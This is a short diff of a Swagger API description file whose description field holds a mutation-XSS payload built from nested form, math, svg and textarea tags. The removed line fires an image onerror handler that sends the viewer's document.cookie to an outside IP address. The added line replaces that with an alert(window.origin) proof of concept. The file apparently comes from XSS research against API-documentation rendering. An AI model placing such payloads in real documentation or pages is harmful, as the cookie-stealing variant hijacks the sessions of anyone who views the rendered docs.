@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |                                                                                                     # change this
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='http://157.230.51.253/?'+document.cookie;>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src='#' onerror='alert(window.origin)'>">
 
   version: production
 basePath: /JSSResource/
